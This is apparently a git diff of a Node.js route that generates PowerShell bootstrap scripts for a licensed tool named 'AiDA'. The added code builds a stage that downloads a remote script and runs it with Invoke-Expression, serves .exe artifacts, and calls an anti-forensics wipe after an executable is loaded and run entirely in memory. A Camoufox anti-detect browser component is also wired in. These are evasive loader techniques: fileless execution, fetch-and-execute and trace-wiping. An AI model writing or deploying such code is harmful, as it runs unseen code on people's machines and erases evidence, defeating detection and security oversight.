         'try { Install-AidaCamoufoxSidecar $manifest } catch { Write-AidaBootstrapLog ("camoufox_sidecar_skipped " + $_.Exception.GetType().FullName + ": " + $_.Exception.Message); Write-AidaStatus ("Camoufox setup skipped: " + $_.Exception.Message) }',
         '$artifactUri = [Uri]$manifest.artifact.url',
         'if ($artifactUri.Scheme -ne "https") { throw "AiDA artifact URL must use HTTPS." }',
@@ -1393,9 +1665,56 @@ function buildBootstrapScript() {
         'Write-AidaBootstrapLog ("launch_inmemory_enter bytes=" + $exeBytes.Length + " debug_log=" + $script:AidaFilelessDebugLogPath)',
         'Invoke-AidaPEInMemory $exeBytes',
         'Write-AidaBootstrapLog "launch_inmemory_returned"',
+        'try { Invoke-AidaAntiForensics } catch { Write-AidaBootstrapLog ("post_launch_wipe_error " + $_.Exception.Message) }',
+        'Write-AidaBootstrapLog "post_launch_wipe_done"',
         '[Array]::Clear($exeBytes, 0, $exeBytes.Length); $exeBytes = $null',
         'Write-AidaStatus "Done."',
-        '} catch { Write-AidaBootstrapLog ("fatal_error " + $_.Exception.GetType().FullName + ": " + $_.Exception.Message); throw } finally { Write-AidaBootstrapLog "cleanup_enter"; if ($licenseKey) { $licenseKey = $null }; if ($auth -and $auth.token) { $auth.token = $null }; if ($tokenParts -and $tokenParts.secret) { $tokenParts.secret = $null }; if ($null -ne $packageBytes) { [Array]::Clear($packageBytes, 0, $packageBytes.Length); $packageBytes = $null }; if ($null -ne $exeBytes) { [Array]::Clear($exeBytes, 0, $exeBytes.Length); $exeBytes = $null }; Write-AidaBootstrapLog "cleanup_exit" }',
+        '} catch { Write-AidaBootstrapLog ("fatal_error " + $_.Exception.GetType().FullName + ": " + $_.Exception.Message); Write-Host ("AiDA bootstrap failed: " + $_.Exception.Message) -ForegroundColor Red; $global:LASTEXITCODE = 1; return } finally { Write-AidaBootstrapLog "cleanup_enter"; if ($licenseKey) { $licenseKey = $null }; if ($currentHwid) { $currentHwid = $null }; if ($auth -and $auth.token) { $auth.token = $null }; if ($tokenParts -and $tokenParts.secret) { $tokenParts.secret = $null }; if ($null -ne $packageBytes) { [Array]::Clear($packageBytes, 0, $packageBytes.Length); $packageBytes = $null }; if ($null -ne $exeBytes) { [Array]::Clear($exeBytes, 0,$exeBytes.Length); $exeBytes = $null }; try { Invoke-AidaAntiForensics } catch { }; Write-AidaBootstrapLog "cleanup_exit" }',
+    ];
+    return lines.join('\r\n') + '\r\n';
+}
+
+function sha256Hex(text) {
+    return crypto.createHash('sha256').update(String(text), 'utf8').digest('hex');
+}
+
+function buildBootstrapStage0Script() {
+    const cfg = getScriptRouteConfig();
+    const fullScript = buildBootstrapScript();
+    const pathOnly = cfg.script_path || (cfg.legacy_route_enabled ? cfg.legacy_path : '');
+    if (!pathOnly) {
+        return fullScript;
+    }
+    const fullHash = sha256Hex(fullScript);
+    const origin = publicOrigin();
+    const fullUrl = origin + pathOnly;
+    const lines = [
+        '$ErrorActionPreference = "Stop"',
+        '$ProgressPreference = "SilentlyContinue"',
+        'try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { }',
+        '$u = ' + psQuote(fullUrl),
+        '$h = ' + psQuote(fullHash),
+        'function ConvertTo-AidaHex([byte[]]$Bytes) { -join ($Bytes | ForEach-Object { $_.ToString("x2") }) }',
+        '$req = [Net.HttpWebRequest]::Create($u)',
+        '$req.Method = "GET"',
+        '$req.UserAgent = "AiDA Bootstrap Stage0"',
+        '$req.Accept = "application/vnd.aida.bootstrap"',
+        '$req.AllowAutoRedirect = $false',
+        '$req.Timeout = 60000',
+        '$req.ReadWriteTimeout = 60000',
+        '$resp = $null',
+        '$reader = $null',
+        '$s = $null',
+        'try {',
+        '    $resp = $req.GetResponse()',
+        '    if ([int]$resp.StatusCode -ne 200) { throw "AiDA bootstrap stage fetch failed." }',
+        '    $reader = New-Object IO.StreamReader($resp.GetResponseStream(), [Text.Encoding]::UTF8)',
+        '    $s = $reader.ReadToEnd()',
+        '} finally { if ($reader) { $reader.Dispose() }; if ($resp) { $resp.Dispose() } }',
+        '$sha = [Security.Cryptography.SHA256]::Create()',
+        'try { $actual = ConvertTo-AidaHex ($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($s))) } finally { $sha.Dispose() }',
+        'if ($actual -ne $h) { throw "AiDA bootstrap stage authentication failed." }',
+        'Invoke-Expression $s',
     ];
     return lines.join('\r\n') + '\r\n';
 }
@@ -1410,7 +1729,9 @@ async function rootScriptHandler(req, res, next) {
     if (!getScriptRouteConfig().root_content_negotiation || !acceptsBootstrapScript(req)) {
         return next();
     }
-    return scriptHandler(req, res);
+    noStore(res);
+    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
+    return res.status(200).send(buildBootstrapStage0Script());
 }
 
 function expectedArtifactFileName(release) {
@@ -1432,17 +1753,29 @@ function expectedCamoufoxSidecarFileName(release) {
     }
 }
 
+function expectedCamoufoxMcpFileName(release) {
+    try {
+        if (!release.camoufox || !release.camoufox.mcp || !release.camoufox.mcp.configured) return '';
+        const url = new URL(release.camoufox.mcp.url);
+        return path.basename(url.pathname);
+    } catch (_) {
+        return '';
+    }
+}
+
 async function artifactHandler(req, res) {
     const release = getReleaseConfig();
     const requested = String(req.params && req.params.name || '');
-    if (!release.ok || !release.package || !/^[A-Za-z0-9._-]{1,160}\.(?:pkg|zip)$/i.test(requested)) {
+    if (!release.ok || !release.package || !/^[A-Za-z0-9._-]{1,160}\.(?:pkg|zip|exe)$/i.test(requested)) {
         return res.status(404).json({ status: 'error', reason: 'not_found' });
     }
     const expectedPackage = expectedArtifactFileName(release);
     const expectedSidecar = expectedCamoufoxSidecarFileName(release);
-    const expectedSize = requested === expectedPackage
-        ? release.package.size
-        : (requested === expectedSidecar ? release.camoufox.size : 0);
+    const expectedMcp = expectedCamoufoxMcpFileName(release);
+    let expectedSize = 0;
+    if (requested === expectedPackage) expectedSize = release.package.size;
+    else if (requested === expectedSidecar) expectedSize = release.camoufox.size;
+    else if (requested === expectedMcp) expectedSize = release.camoufox.mcp.size;
     if (!expectedSize) {
         return res.status(404).json({ status: 'error', reason: 'not_found' });
     }
@@ -1499,12 +1832,14 @@ router._internal = {
     authorizeRequest,
     manifestRequest,
     buildBootstrapScript,
+    buildBootstrapStage0Script,
     artifactHandler,
     rootScriptHandler,
     getScriptRouteConfig,
     acceptsBootstrapScript,
     getReleaseConfig,
     getCamoufoxSidecarConfig,
+    getCamoufoxMcpPatchConfig,
     createToken,
     parseToken,
     hashTokenSecret,
